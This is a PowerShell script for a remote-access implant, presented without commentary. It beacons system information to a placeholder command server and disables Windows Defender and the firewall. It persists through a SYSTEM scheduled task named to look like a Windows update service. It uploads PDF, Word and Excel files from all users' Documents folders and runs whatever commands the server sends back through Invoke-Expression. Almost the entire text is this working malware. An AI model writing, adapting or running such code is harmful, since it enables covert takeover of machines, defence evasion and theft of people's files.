$C2Server = "malware.example.com"
$C2Port = 8080

function Get-SystemInfo {
    $sysinfo = @{}
    $sysinfo["ComputerName"] = $env:COMPUTERNAME
    $sysinfo["Username"] = $env:USERNAME
    $sysinfo["OSVersion"] = (Get-WmiObject Win32_OperatingSystem).Version
    $sysinfo["ProcessorCount"] = (Get-WmiObject Win32_ComputerSystem).NumberOfProcessors
    return $sysinfo
}

function Invoke-WebRequest-Obfuscated {
    $url = "http://$C2Server:$C2Port/beacon"
    $data = Get-SystemInfo | ConvertTo-Json

    try {
        $encoded = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($data))
        $response = Invoke-WebRequest -Uri $url -Method POST -Body $encoded -UseBasicParsing
        return $response.Content
    } catch {
        return $null
    }
}

function Disable-DefenderThreatNotifications {
    # Disable Windows Defender
    Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue

    # Disable Windows Firewall
    Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled $false -ErrorAction SilentlyContinue
}

function Create-ScheduledTask-Persistence {
    $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -Command `"$PSCommandPath`""
    $trigger = New-ScheduledTaskTrigger -AtLogOn
    $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -RunLevel Highest

    Register-ScheduledTask -TaskName "WindowsUpdateService" -Action $action -Trigger $trigger -Principal $principal -Force
}

function Exfiltrate-Data {
    $sensitive_files = Get-ChildItem -Path "C:\Users\*\Documents" -Recurse -Include "*.pdf", "*.docx", "*.xlsx"

    foreach ($file in $sensitive_files) {
        $content = [Convert]::ToBase64String([IO.File]::ReadAllBytes($file.FullName))
        $exfil_url = "http://$C2Server/exfil?file=$($file.Name)"

        try {
            Invoke-WebRequest -Uri $exfil_url -Method POST -Body $content -UseBasicParsing
        } catch {
            continue
        }
    }
}

Disable-DefenderThreatNotifications
Create-ScheduledTask-Persistence

while ($true) {
    $command = Invoke-WebRequest-Obfuscated

    if ($command) {
        try {
            $result = Invoke-Expression -Command $command
            Invoke-WebRequest -Uri "http://$C2Server/result" -Method POST -Body $result -UseBasicParsing
        } catch {
            continue
        }
    }

    Start-Sleep -Seconds 60
}